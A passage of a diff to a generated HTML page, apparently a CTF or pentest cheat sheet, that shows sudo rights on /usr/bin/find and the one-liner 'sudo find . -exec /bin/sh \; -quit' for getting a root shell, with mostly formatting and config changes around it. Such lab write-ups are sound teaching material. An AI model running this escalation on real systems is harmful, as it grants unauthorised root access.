+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7"></a>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8"></a>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9"></a>User john may run the following commands on base:
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10"></a>    (root : root) /usr/bin/find
+</span></code></pre></div></td></tr></table></div>
 <p>See <a href="../suid-binaries/">cheat sheet about suid binaries</a> and:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>sudo<span class="w"> </span>find<span class="w"> </span>.<span class="w"> </span>-exec<span class="w"> </span>/bin/sh<span class="w"> </span><span class="se">\;</span><span class="w"> </span>-quit
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>sudo<span class="w"> </span>find<span class="w"> </span>.<span class="w"> </span>-exec<span class="w"> </span>/bin/sh<span class="w"> </span><span class="se">\;</span><span class="w"> </span>-quit
+</span></code></pre></div></td></tr></table></div>
 <p>Now you are root and can echo /root/root.txt</p>
 
 <!-- This section adds support for localized revision dates -->
@@ -17119,7 +17206,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
